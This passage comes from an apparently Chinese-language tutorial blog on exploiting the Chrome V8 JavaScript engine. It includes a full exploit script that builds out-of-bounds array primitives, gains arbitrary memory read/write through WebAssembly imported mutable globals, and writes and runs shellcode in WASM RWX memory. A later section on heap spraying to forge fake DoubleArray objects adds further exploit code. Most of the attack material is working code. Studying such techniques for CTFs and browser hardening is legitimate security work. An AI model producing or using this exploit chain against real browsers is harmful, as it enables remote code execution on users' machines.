class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>, <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0x6E</span>, <span class="number">0x61</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x67</span></span><br><span class="line">])</span><br><span class="line"><span class="keyword">const</span> <span class="variable language_">global</span> = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Global</span>(&#123; <span class="attr">value</span>: <span class="string">&#x27;i64&#x27;</span>, <span class="attr">mutable</span>: <span class="literal">true</span> &#125;, <span class="number">0n</span>);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code), &#123; <span class="attr">js</span>: &#123; <span class="variable language_">global</span> &#125; &#125;);</span><br><span class="line"><span class="keyword">var</span> get_global = wasm_instance.<span class="property">exports</span>.<span class="property">get_global</span>;</span><br><span class="line"><span class="keyword">var</span> set_global = wasm_instance.<span class="property">exports</span>.<span class="property">set_global</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">set_global</span>(<span class="number">0x114514n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title function_">get_global</span>());</span><br><span class="line"></span><br><span class="line">% <span class="title class_">DebugPrint</span>(wasm_instance);</span><br><span class="line">% <span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>

<p>这介绍一下 wasm code 的生成方法：<br>首先编写一个能实现相应的功能的 wat 代码：</p>
<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(<span class="title function_ invoke__">module</span></span><br><span class="line">   (<span class="keyword">global</span> <span class="variable">$g</span> (import <span class="string">&quot;js&quot;</span> <span class="string">&quot;global&quot;</span>) (mut i64))</span><br><span class="line">   (<span class="title function_ invoke__">func</span> (export <span class="string">&quot;get_global&quot;</span>) (result i64) (<span class="keyword">global</span>.get <span class="variable">$g</span>))</span><br><span class="line">   (<span class="title function_ invoke__">func</span> (export <span class="string">&quot;set_global&quot;</span>) (param <span class="variable">$p</span> i64) (<span class="keyword">global</span>.set <span class="variable">$g</span> (local.get <span class="variable">$p</span>)))</span><br><span class="line">)</span><br></pre></td></tr></table></figure></div>

<p>然后在<a class="link"   target="_blank" rel="noopener" href="https://webassembly.github.io/wabt/demo/wat2wasm/" >这个网站 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>上转换为 wasm 并下载转换后的文件，下载的文件中的数据即为 wasm code 。</p>
<p>这里打印出 <code>wasm_instance</code> 发现其中的 <code>imported_mutable_globals</code> 是一个完整的指针并且指向指向 <code>global</code> 对应的内存的指针（<code>global</code> 的二级指针），因此可以通过堆内任意地址读写修改 <code>imported_mutable_globals</code> 指向一个 <code>DoubleArray</code> 从而实现任意地址读写。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/d34817efdf7ab68e6c3a4130c1043439.png"
                      alt="在这里插入图片描述"
                ><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/fb1b9744b7ceb4fef1d8f40eb43d5504.png"
                      alt="在这里插入图片描述"
                ><br>之后的操作可以参考 OOB 。exp 如下：</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> array_buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x8</span>);</span><br><span class="line"><span class="keyword">let</span> data_view = <span class="keyword">new</span> <span class="title class_">DataView</span>(array_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">d2u</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setFloat64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">u2d</span>(<span class="params">value</span>) &#123;</span><br><span class="line">    data_view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value);</span><br><span class="line">    <span class="keyword">return</span> data_view.<span class="title function_">getFloat64</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">val</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + val.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> oob_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> object_array = [&#123;&#125;];</span><br><span class="line"><span class="keyword">var</span> double_array = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> rw_array = [<span class="number">.1</span>];</span><br><span class="line">oob_array.<span class="title function_">setLength</span>(<span class="number">114514</span>);</span><br><span class="line"></span><br><span class="line">double_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">12</span>]);</span><br><span class="line">object_array_map = <span class="title function_">d2u</span>(oob_array[<span class="number">8</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] double array map: &quot;</span> + <span class="title function_">hex</span>(double_array_map &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] object array map: &quot;</span> + <span class="title function_">hex</span>(object_array_map &amp; <span class="number">0xFFFFFFFFn</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">8</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    object_array[<span class="number">0</span>] = obj;</span><br><span class="line">    oob_array[<span class="number">8</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(object_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">fake_object</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">12</span>] = <span class="title function_">u2d</span>(double_array_map);</span><br><span class="line">    double_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(offset);</span><br><span class="line">    oob_array[<span class="number">12</span>] = <span class="title function_">u2d</span>(object_array_map);</span><br><span class="line">    <span class="keyword">return</span> double_array[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">offset</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">17</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>)) | (<span class="title function_">d2u</span>(oob_array[<span class="number">17</span>]) &amp; <span class="number">0xFFFFFFFF00000000n</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(rw_array[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">offset, value</span>) &#123;</span><br><span class="line">    oob_array[<span class="number">17</span>] = <span class="title function_">u2d</span>((((offset - <span class="number">8n</span>) | <span class="number">1n</span>)) | (<span class="title function_">d2u</span>(oob_array[<span class="number">17</span>]) &amp; <span class="number">0xFFFFFFFF00000000n</span>));</span><br><span class="line">    rw_array[<span class="number">0</span>] = <span class="title function_">u2d</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> sandbox_base = <span class="title function_">read</span>(<span class="number">24n</span>) &amp; <span class="number">0xFFFFFFFF00000000n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] sandbox base: &quot;</span> + <span class="title function_">hex</span>(sandbox_base));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_code = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x61</span>, <span class="number">0x73</span>, <span class="number">0x6D</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x09</span>, <span class="number">0x02</span>, <span class="number">0x60</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x60</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x7E</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x0E</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x6A</span>, <span class="number">0x73</span>, <span class="number">0x06</span>, <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>,</span><br><span class="line">    <span class="number">0x03</span>, <span class="number">0x7E</span>, <span class="number">0x01</span>, <span class="number">0x03</span>, <span class="number">0x03</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x1B</span>, <span class="number">0x02</span>, <span class="number">0x0A</span>, <span class="number">0x67</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>,</span><br><span class="line">    <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>, <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x73</span>, <span class="number">0x65</span>, <span class="number">0x74</span>, <span class="number">0x5F</span>, <span class="number">0x67</span>, <span class="number">0x6C</span>, <span class="number">0x6F</span>,</span><br><span class="line">    <span class="number">0x62</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x0D</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x23</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x20</span>,</span><br><span class="line">    <span class="number">0x00</span>, <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, <span class="number">0x15</span>, <span class="number">0x04</span>, <span class="number">0x6E</span>, <span class="number">0x61</span>, <span class="number">0x6D</span>, <span class="number">0x65</span>, <span class="number">0x02</span>, <span class="number">0x08</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x01</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x70</span>, <span class="number">0x07</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x67</span></span><br><span class="line">])</span><br><span class="line"><span class="keyword">const</span> <span class="variable language_">global</span> = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Global</span>(&#123; <span class="attr">value</span>: <span class="string">&#x27;i64&#x27;</span>, <span class="attr">mutable</span>: <span class="literal">true</span> &#125;, <span class="number">0n</span>);</span><br><span class="line"><span class="keyword">var</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code), &#123; <span class="attr">js</span>: &#123; <span class="variable language_">global</span> &#125; &#125;);</span><br><span class="line"><span class="keyword">var</span> get_global = wasm_instance.<span class="property">exports</span>.<span class="property">get_global</span>;</span><br><span class="line"><span class="keyword">var</span> set_global = wasm_instance.<span class="property">exports</span>.<span class="property">set_global</span>;</span><br><span class="line"></span><br><span class="line">imported_mutable_globals = [<span class="number">.1</span>];</span><br><span class="line"><span class="keyword">var</span> imported_mutable_globals_addr = sandbox_base + <span class="title function_">offset_of</span>(imported_mutable_globals) - <span class="number">0x9n</span>;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] imported_mutable_globals: &quot;</span> + <span class="title function_">hex</span>(imported_mutable_globals_addr));</span><br><span class="line"><span class="title function_">write</span>(<span class="title function_">offset_of</span>(wasm_instance) + <span class="number">0x50n</span>, imported_mutable_globals_addr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_read</span>(<span class="params">addr</span>) &#123;</span><br><span class="line">    imported_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">get_global</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">arbitrary_address_write</span>(<span class="params">addr, value</span>) &#123;</span><br><span class="line">    imported_mutable_globals[<span class="number">0</span>] = <span class="title function_">u2d</span>(addr);</span><br><span class="line">    <span class="title function_">set_global</span>(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> wasm_code2 = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>, <span class="number">97</span>, <span class="number">115</span>, <span class="number">109</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">133</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">96</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">127</span>, <span class="number">3</span>, <span class="number">130</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">1</span>, <span class="number">112</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">129</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>,</span><br><span class="line">    <span class="number">0</span>, <span class="number">7</span>, <span class="number">145</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">6</span>, <span class="number">109</span>, <span class="number">101</span>, <span class="number">109</span>, <span class="number">111</span>, <span class="number">114</span>, <span class="number">121</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">109</span>,</span><br><span class="line">    <span class="number">97</span>, <span class="number">105</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">138</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">132</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">128</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">65</span>,</span><br><span class="line">    <span class="number">42</span>, <span class="number">11</span>]);</span><br><span class="line"><span class="keyword">let</span> wasm_instance2 = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(<span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasm_code2));</span><br><span class="line"><span class="keyword">let</span> f = wasm_instance2.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"><span class="keyword">var</span> rwx_mem_addr = <span class="title function_">arbitrary_address_read</span>(sandbox_base + <span class="title function_">offset_of</span>(wasm_instance2) - <span class="number">1n</span> + <span class="number">0x60n</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[*] rwx mem addr: &quot;</span> + <span class="title function_">hex</span>(rwx_mem_addr));</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [</span><br><span class="line">    <span class="number">0x636c6163782fb848n</span>,</span><br><span class="line">    <span class="number">0x73752fb848500000n</span>,</span><br><span class="line">    <span class="number">0x8948506e69622f72n</span>,</span><br><span class="line">    <span class="number">0x89485750c03148e7n</span>,</span><br><span class="line">    <span class="number">0x3ac0c748d23148e6n</span>,</span><br><span class="line">    <span class="number">0x4944b84850000030n</span>,</span><br><span class="line">    <span class="number">0x48503d59414c5053n</span>,</span><br><span class="line">    <span class="number">0x485250c03148e289n</span>,</span><br><span class="line">    <span class="number">0x00003bc0c748e289n</span>,</span><br><span class="line">    <span class="number">0x0000000000050f00n</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123;</span><br><span class="line">    <span class="title function_">arbitrary_address_write</span>(rwx_mem_addr + <span class="title class_">BigInt</span>(i) * <span class="number">8n</span>, shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">f</span>();</span><br></pre></td></tr></table></figure></div>

<h1 id="堆喷伪造对象"><a href="#堆喷伪造对象" class="headerlink" title="堆喷伪造对象"></a>堆喷伪造对象</h1><p><strong>指针压缩</strong>下的通用堆喷技术，效果为：获取一个低 4 字节固定的对象</p>
<h2 id="v8-堆块管理结构"><a href="#v8-堆块管理结构" class="headerlink" title="v8 堆块管理结构"></a>v8 堆块管理结构</h2><p>一般而言，V8 中的 Heap Object 都分配在 4GB 堆空间的 <code>rw-</code> 页面上。在堆块页面的起始部分，有一段空间是用来存储堆块的元信息的，在 V8 的堆结构中有 <code>0x2118</code> 字节（具体看版本）用来存储堆结构相关信息。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/31dc3078d810bc5d919b3b19e6e7c3b6.png"
                      alt="在这里插入图片描述"
                ><br>其中关键字段解释如下：</p>
<ul>
<li><code>0x0000000000040000</code>：堆大小。</li>
<li><code>0x00000be508042118</code>：堆的起始地址。</li>
<li><code>0x00000be508080000</code>：堆指针，表示该堆已经被使用到哪了，即现在堆指针指向 0xbe508080000 。</li>
<li><code>0x000000000003dee8</code>： 已经被使用的 size ， 0x3dee8 + 0x2118 &#x3D; 0x40000 。</li>
<li><code>0x0000000000002118</code>：堆头大小。</li>
</ul>
<p>如果这个时候，我申请一个 <code>0xf700</code> 大小的数组。如果开启指针压缩，一个地址4字节，那么就是需要 <code>0xf700 * 4 + 0x2118 = 0x3fd18</code>，再对齐一下，那么就是<code>0x40000</code>大小的堆。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="title class_">Array</span>(<span class="number">0xf700</span>);</span><br><span class="line">% <span class="title class_">DebugPrint</span>(a);</span><br><span class="line">% <span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure></div>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/Chrome-v8-pwn/images/e958497f36a9306636a16a77a970e684.png"
                      alt="在这里插入图片描述"
                ><br><code>elements</code> 字段地址为 <code>0x559081c0000+ 0x80000 + 0x2118 + 0x1 = 0x055908242119</code> 。在启动指针压缩时，在堆中储存的地址为 4 字节，而根据上述堆的特性，我们能<strong>确定低 2 字节为 <code>0x2119</code></strong> ，而<strong>一般情况下其高 2 字节也是不变的</strong>，所以这里其实 <strong>4 字节都已经确认的</strong>。</p>
<p>还有一个比较重要的点是，该 <code>FixedArray</code> 是一个大对象，其是不受 <code>gc</code> 影响的，所以这里的效果就是获取一个已经地址的内容可控的内存区域。</p>
<h2 id="任意地址对象伪造"><a href="#任意地址对象伪造" class="headerlink" title="任意地址对象伪造"></a>任意地址对象伪造</h2><p>如果存在任意地址对象伪造漏洞（<code>fake_object</code> 原语），则我们可以在一个大的 <code>DoubleArray</code> 中伪造一个 <code>DoubleArray</code> 然后实现 <code>offset_of</code> ，<code>arbitrary_offset_read</code> ，<code>arbitrary_offset_write</code> 原语。</p>
<p>首先我们先创建一个大的 <code>DoubleArray</code> 并在里面伪造一个 <code>DoubleArray</code> 。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/83f25f19f6050681363a6e709af40184.png"
                      alt="在这里插入图片描述" style="zoom: 33%;" 
                ><br>这里需要注意的是：通过调试可知，我们只需要伪造 <code>map</code> 的前 16 字节即可。而 <code>map</code> 的前 16 字节基本是不变的。</p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> spray_array = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0xf700</span>).<span class="title function_">fill</span>(<span class="number">1.1</span>);</span><br><span class="line"><span class="keyword">let</span> spray_array_data_offset = <span class="number">0x00202141n</span> + <span class="number">7n</span>;  <span class="comment">// spray_array 的 element 中成员的起始地址</span></span><br><span class="line"><span class="keyword">let</span> map_offset = spray_array_data_offset + <span class="number">0x1000n</span>;  <span class="comment">// 伪造的 map 在沙箱中的偏移</span></span><br><span class="line"><span class="keyword">let</span> fake_double_array_offset = map_offset + <span class="number">0x1000n</span>;  <span class="comment">// 伪造的 fake_double_array 在沙箱中的偏移</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 伪造 fake_double_array 的 map ，这里只需要伪造前 16 字节。</span></span><br><span class="line">spray_array[(map_offset - spray_array_data_offset) / <span class="number">8n</span>] = <span class="title function_">u2d</span>(<span class="number">0x1a04040400002141n</span>);</span><br><span class="line">spray_array[(map_offset - spray_array_data_offset) / <span class="number">8n</span> + <span class="number">1n</span>] = <span class="title function_">u2d</span>(<span class="number">0xa0007ff1100083an</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// fake_double_array 的 map 指针指向伪造的 map</span></span><br><span class="line">spray_array[(fake_double_array_offset - spray_array_data_offset) / <span class="number">8n</span>] = <span class="title function_">u2d</span>(map_offset | <span class="number">1n</span> | (<span class="number">0x00002259n</span> &lt;&lt; <span class="number">32n</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 利用任意地址对象伪造漏洞（fake_object）泄露出 fake_double_array</span></span><br><span class="line"><span class="keyword">let</span> fake_double_array = <span class="title function_">trigger</span>(fake_double_array_offset | <span class="number">1n</span>);</span><br></pre></td></tr></table></figure></div>
<p><code>offset_of</code> 原语实现：我们只需要再申请一个大的 <code>ObjectArray</code>（我们称之为 <code>spray_object_array</code>）然后让伪造的 <code>DoubleArray</code> 的 <code>elements</code> 指针指向 <code>spray_object_array</code> 的 <code>elements</code>（<code>elements</code> 在沙箱内偏移固定）造成类型混淆。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/2b4d01cdf3c289241c8526bdf9adbc50.png"
                      alt="在这里插入图片描述" style="zoom:33%;" 
                ></p>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> spray_object_array = <span class="keyword">new</span> <span class="title class_">Array</span>(<span class="number">0xf700</span>).<span class="title function_">fill</span>(&#123;&#125;);</span><br><span class="line"><span class="keyword">let</span> object_array_element_offset = <span class="number">0x00282141n</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">offset_of</span>(<span class="params">object</span>) &#123;</span><br><span class="line">    <span class="comment">// 将 object 添加到 spray_object_array 的 elements 中</span></span><br><span class="line">    spray_object_array[<span class="number">0</span>] = object;</span><br><span class="line">    <span class="comment">// fake_double_array 的 elements 指针指向 spray_object_array 的 elements</span></span><br><span class="line">    spray_array[(fake_double_array_offset - spray_array_data_offset) / <span class="number">8n</span> + <span class="number">1n</span>] = <span class="title function_">u2d</span>(object_array_element_offset | <span class="number">1n</span> | (<span class="number">0x00000002n</span> &lt;&lt; <span class="number">32n</span>));</span><br><span class="line">    <span class="comment">// 从 fake_double_array 读出 object 在沙箱中的偏移</span></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">d2u</span>(fake_double_array[<span class="number">0</span>]) &amp; <span class="number">0xFFFFFFFFn</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
